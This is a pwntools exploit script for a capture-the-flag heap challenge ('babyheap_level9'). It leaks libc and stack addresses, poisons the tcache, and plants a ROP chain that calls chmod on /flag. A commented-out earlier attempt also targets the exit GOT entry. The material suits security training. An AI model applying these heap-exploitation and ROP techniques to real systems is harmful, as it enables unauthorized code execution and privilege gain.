#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyheap_level5
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level9')
os.chdir('/challenge')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break print_menu
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

END_OF_MENU = b"Choice:"

def malloc(p, size, content):
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" % (size))
    p.recvuntil(b"Content:")
    p.sendline(b"%b" % (content))
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"2")
    print(p.recvline())
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    
    p.recvuntil(b"content:")
    p.sendline(b"%b" % (content)) 
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def arbitary_read(p, value):
    libc_offset = 0xb1690
    p.sendline(b"7")
    p.recvuntil(b"format):")
    p.sendline(b"%d" % (value))
    p.recvuntil("value is:")
    result =  int(p.recvline(keepends=False), 16)
    p.recvuntil(END_OF_MENU)
    return result

# def launch_attack(p):
#     libc_base = arbitary_read(p, 4210736) - 0xb1690
#     print('libc_base: ', hex(libc_base))
#     environ_var = libc_base + 0x3ee098
#     environ_stack = arbitary_read(p, environ_var)
#     print('environ_stack: ', hex(environ_stack))
#     ret_add = environ_stack + 560
#     print('ret add:', hex(ret_add))

#     pop_rdi = 0x2155f
#     pop_rsi = 0x23e8a
#     mov_eax = 0x10fbd0  #: mov eax, 0x5a ; syscall
#     leave_ret = 0x34d33 #: leave ; ret

#     def rop_chain():
#         return p64(libc_base + pop_rdi) + p64(ret_add + 40) + p64(libc_base + pop_rsi) + p64(0o777) + p64(libc_base + mov_eax) + b"/flag\0\0\0" + p64(libc_base + leave_ret)


#     malloc(p, 8, b'a')
#     malloc(p, 8, b'a')
#     free(p, 1)
#     free(p, 0)
#     content = b'a'*(0x20 - 8) + b'\x21' + b'\x00'*7 + p64(ret_add)
#     print(len(content))
#     malloc(p, 8, content)
#     malloc(p, 8, b'a')
#     malloc(p, 8, rop_chain())
#     free(p, 1)
#     free(p, 0)
#     malloc(p, 32, b'a')
#     malloc(p, 32, b'a')
#     free(p, 1)
#     free(p, 0)
#     content = b'a'*(0x30 - 8) + b'\x21' + b'\x00'*7 + p64(exe.got['exit'])
#     malloc(p, 32, content)
#     malloc(p, 32, b'a')
#     malloc(p, 32, p64(ret_add))
#     p.sendline(b'5')

#     p.interactive()  


def launch_attack(p):
    libc_base = arbitary_read(p, 4210736) -0xb1690 #0xb1690 -> vmmap libc_base - arbitarty read base
    print('libc_base: ', hex(libc_base))
    environ_var = libc_base + 0x3ee098 #objdump -T libc.so.6 | grep environ
    environ_stack = arbitary_read(p, environ_var)
    print('environ_stack: ', hex(environ_stack))
    ret_add = environ_stack - 352
    print('add_chunk_rip:', hex(ret_add))

    #ret add 0x7fff2d289918 - 352 = 0x7fff2d2897b8

    pop_rdi = 0x2155f
    pop_rsi = 0x23e8a
    mov_eax = 0x10fbd0  #: mov eax, 0x5a ; syscall
    leave_ret = 0x34d33 #: leave ; ret

    def rop_chain():
        return b"/flag\0\0\0" + p64(libc_base + pop_rdi) + p64(ret_add - 8) + p64(libc_base + pop_rsi) + p64(0o777) + p64(libc_base + mov_eax) + p64(libc_base + leave_ret)
    print(hex(libc_base + pop_rdi), hex(libc_base + pop_rsi), hex(libc_base + mov_eax))

    for _ in range(9):
        malloc(p, 64, b'a')
    p.sendline(b"4")
    p.recvuntil(b"Index:")
    p.sendline(b"7")
    print(p.recvuntil(END_OF_MENU))
    for i in range(8):
        free(p, i)
    free(p, 8)
    free(p, 7)
    for _ in range(7):
        malloc(p, 64, b'a')
    
    malloc(p, 64, p64(ret_add - 8 ))
    malloc(p, 64, b'a')
    malloc(p, 64, b'a')
    malloc(p, 64, rop_chain())

    

    # free(p, 8)
    # for _ in range(7):
    #     malloc(p, 64, b'a')
    # free(p, 6)
    # malloc(p, 64, b'a')
    # malloc(p, 64, rop_chain())
    
    

    





    p.interactive()

    #add_chunk+61
    #environ_stack - add_chunk_rip = 0x7ffdfab9cb78 - 0x7ffdfab9ca18

# 0x401150 - 0x9dce0 =  0x363470
# 0x401150 - 0x9f630
#404030 = 4210736 = 0x7f14ed69e690 - 0x363470 heap -> 0x7f574739a000 ... strlen -> 0x7f574744b690

#0xb1690
#0x7f9816564000 - 0x7f9816615690
# 0x7ffee0d307d8 - 0x7f73b338e000
# 0x7ffeabdf9558 - 0x7f788d418000

#0x7f788d418000 + 0x3ee098

#environ_Var = libc_base + environ_offset 
#environ_var - return_addres =  -560

io.recvuntil(END_OF_MENU)
launch_attack(io)
